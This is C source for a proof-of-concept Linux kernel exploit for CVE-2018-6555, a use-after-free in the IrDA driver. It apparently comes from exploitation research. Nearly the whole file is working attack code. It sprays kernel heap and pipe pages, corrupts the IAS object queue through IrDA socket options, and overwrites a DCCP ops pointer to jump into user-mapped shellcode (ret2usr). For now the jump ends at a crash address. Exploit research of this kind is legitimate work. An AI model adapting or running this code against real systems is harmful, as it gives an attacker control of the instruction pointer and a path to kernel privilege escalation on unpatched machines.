// a poc for ip control (ret2usr) using CVE-2018-6555, modified from SSD's exploit
// https://ssd-disclosure.com/ssd-advisory-irda-linux-driver-uaf/
// https://cdn2.hubspot.net/hubfs/2518562/beVX/bevx-Dissecting-a-17-year-old-Vitaly-Nikolenko.pdf?t=1537941151847
// Author: Lewis_Chen_, kylebot

#define _GNU_SOURCE
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/xfrm.h>
#include <fcntl.h>
#include <sched.h>
#include <unistd.h>
#include "irda.h"
#include "libexp.h"
#include "libpagespray.c"

#define NLA_LENGTH(len)					\
		(NLA_ALIGN(sizeof(struct nlattr)) + (len))
#define NLMSG_TAIL(nmsg)						\
		((struct nlattr *) (((void *) (nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg_len)))
#define NLA_DATA(nla)					\
		((void*)(((char*)(nla)) + NLA_LENGTH(0)))

#define CCID2_OPS_TX_GETSOCKETOPT 0xffffffff82500358
#define SC_LOC 0x00000000ffff8800
#define SHELLCODE "H\xb8HGFECBA@\xff\xe0"
#define CRASH_ADDR 0xffffffffdeadbeef
#define SPRAY_NUM 100

int *stage = 0;
char payload[0x60];
u64 target = CCID2_OPS_TX_GETSOCKETOPT - 4;
int fd1, fd2;

char *saddr = "1111111122222222";
char *daddr = "3333333344444444";
struct sockaddr_nl addr;
struct req_newae {
	struct nlmsghdr n;
	struct xfrm_aevent_id id;
	char buf[2048];
};
struct req_newsa {
	struct nlmsghdr n;
	struct xfrm_usersa_info xsinfo;
	char buf[2048];
};

int irda_set_ias(int fd,char *name)
{
	struct irda_ias_set set;
	int err = 0;
	memset(&set,0,sizeof(set));
	strncpy(set.irda_class_name,name,64);
	memset(&set.irda_attrib_name,'C',255);
	set.irda_attrib_type = 2;
	set.attribute.irda_attrib_octet_seq.len = 8;
	memset(&set.attribute.irda_attrib_octet_seq.octet_seq,0x41,1023);
	set.daddr = 4;
	err = setsockopt(fd,0x10a,0x2,&set,sizeof(set));
	//printf("setsockopt(SET) fd=%d  err=%d\n",fd,err);
	return err;
}

int irda_bind(int fd,u_int16_t  family,u_int8_t lsap_sel,int sir_addr,char *name)
{
	struct sockaddr_irda sa,sa1;
	int err;
	memset(&sa,0,sizeof(sa));
	sa.sir_family =family;
	sa.sir_lsap_sel = lsap_sel;
	sa.sir_addr = sir_addr;
	memcpy(&sa.sir_name,name,25);
	err = bind(fd,(struct sockaddr*)&sa,sizeof(sa));
	//printf("bind fd=%d err=%d\n",fd,err);
	return err;
}

void uaf()
{
	int fd1,fd2,fd3,fd4;
	struct sockaddr_irda sa,sa1;
	int err = 0;

	// defragment(0x60, 0x300);
    
    struct msg_spray_t *spray = msg_spray(NULL, 0x60 - 0x30, 0x600);
	msg_spray_clean(spray);

    prep();
	struct msg_spray_t *spray_1 = msg_spray(NULL, 0x60 - 0x30, 0x300);
    puts("[+] 1st spray done");

	// create 4 IrDa sockets
	fd1 = socket(AF_IRDA, SOCK_STREAM, 0);
	fd2 = socket(AF_IRDA, SOCK_STREAM, 0);
	fd3 = socket(AF_IRDA, SOCK_STREAM, 0);
	
	if (fd1 < 0 || fd2 < 0 || fd3 < 0) {
		perror("[-] fail to create sockets\n");
		exit(-1);
	}
    puts("[+] Created IrDa sockets");

	// bind the first 3
	err = irda_bind(fd1, 4, 0x4a, 0x3, "c");
	if (err < 0) {
		perror("[-] fail to bind fd1\n");
		exit(err);
	}
	err = irda_bind(fd2, 4, 0x4b, 0x3, "c");
	if (err < 0) {
		perror("[-] fail to bind fd2\n");
		exit(err);
	}
	err = irda_bind(fd3, 4, 0x4c, 0x3, "c");
	if (err < 0) {
		perror("[-] fail to bind fd3\n");
		exit(err);
	}
    puts("[+] Binded IrDa sockets");

	// reinsert the middle isa_obj to corrupt the queue
	for (int i = 0; i < 5; i++) {
		/* 0x00 means that it takes self->ias_obj */
		irda_set_ias(fd2, "\x00");
		irda_set_ias(fd3, "\x00");
	}
    puts("[+] Corrupted the queue");

    struct msg_spray_t *spray_2 = msg_spray(NULL, 0x60 - 0x30 , 0x300);
    puts("[+] 2nd spray done");
    

	// free sockets and force UAF
	// ts_fence();
	close(fd3);
	close(fd2);
    close(fd1);
    puts("[+] UAF");

    msg_spray_clean(spray_1);
    msg_spray_clean(spray_2);
    puts("[+] Freed all");

    int ret;
    char take_page_back_buffer[0x1000];  
    for (int i=0; i<0x1000/sizeof(payload); i++) {
    	memcpy(&take_page_back_buffer[i * sizeof(payload)], payload, sizeof(payload));
    }
    //memset(take_page_back_buffer , 'c' , 0x1000);
    for (int i = 0x0 ; i < PIPE_PAGE_NUM; i++) {
	    ret = write(pipe_pages[i][1], take_page_back_buffer, 0x1000);
	    //printf("ret: %#lx\n",ret);
	}
    printf("[+] page spray done!\n");

	// nonsense();
	// defragment(0x60, 8);// fill 8 holes

	// *stage = 1;

	// fprintf(stderr, "[+] Spray heap and overwrite fd3.prev\n");
	// add_key_desc_spray_num(payload, SPRAY_NUM);

    fd4 = socket(AF_IRDA, SOCK_STREAM, 0);
	fprintf(stderr, "[+] Bind 4th socket to overwrite the targetted pointer\n");
	irda_bind(fd4, 4, 0x30, 0x3, "c");
}

void prepare_trigger()
{
	struct sockaddr_in6 in;
	fd1 = socket(AF_INET6, SOCK_DCCP, IPPROTO_IP);
	memset(&in, 0, sizeof(in));
	in.sin6_family = AF_INET6;
	in.sin6_addr = in6addr_loopback;
	in.sin6_port = 0x214e;//htons(0x1000);
	int ret = bind(fd1, (struct sockaddr*)&in, sizeof(in));
	//printf("fd: %d\n", fd1);
	//printf("ret: %d\n", ret);
	ret = listen(fd1, 0x1);
	//printf("ret: %d\n", ret);
	fd2 = socket(AF_INET6, SOCK_DCCP, IPPROTO_IP);
	ret = connect(fd2, (struct sockaddr*)&in, sizeof(in));
	//printf("ret: %d\n", ret);
}

void trigger()
{
	char val[0x10];
	int len = 8;
	getsockopt(fd2, SOL_DCCP, 192, &val, &len);
}

int get_cpu_id(int argc, char **argv)
{
	if(argc < 2) return 0;
	int run_time = atoi(argv[1]);
	return run_time % cpu_num;
}

int main(int argc,char **argv)
{
	sleep(1);
	set_cpu(get_cpu_id(argc, argv));

    memset(payload, 0xcc, 88);
	((long*)payload)[1] = target;

	// prepare shellcode
	void *addr = umem_alloc((void *)(SC_LOC & ~(0xfff)), 0x1000);
	memcpy((void *)SC_LOC, (void *)SHELLCODE, sizeof(SHELLCODE));
	long *ptr = (long *)(SC_LOC+2);
	*ptr = CRASH_ADDR;

	prepare_trigger();
	uaf();
	trigger();
}
